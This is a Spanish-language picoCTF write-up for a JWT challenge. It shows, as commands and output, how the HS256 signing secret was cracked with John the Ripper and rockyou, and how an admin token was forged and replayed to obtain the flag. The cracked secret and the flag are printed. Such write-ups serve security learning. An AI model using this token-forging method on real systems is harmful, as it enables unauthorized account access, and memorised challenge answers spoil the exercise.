## Descripción
Check the admin scratchpad!

[http://fickle-tempest.picoctf.net:54847](http://fickle-tempest.picoctf.net:54847/)
1

What is that cookie?

2

Have you heard of JWT?
## Solución
```


curl -s -i -X POST -d "user=kali" http://fickle-tempest.picoctf.net:54847/

Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoic2ViYXN0aWFuIn0.HYE1UYMHl3nReNzkNXrxXxoQCbcQvN6yEVwXVaJTIuU; Path=/

Guardé el JWT en un archivo:

echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoic2ViYXN0aWFuIn0.HYE1UYMHl3nReNzkNXrxXxoQCbcQvN6yEVwXVaJTIuU" > jwt.txt

Descomprimí rockyou:

sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt

ilovepico

Con el secreto ilovepico cambié el payload a admin:

{"user":"admin"}

JWT de admin:

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s

Entré usando la cookie modificada:

curl -s -b "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s" http://fickle-tempest.picoctf.net:54847/

picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
```
## Notas Adicionales
- La cookie del sitio era un JWT firmado con HS256.
## Referencias
- [http://fickle-tempest.picoctf.net:54847](http://fickle-tempest.picoctf.net:54847/)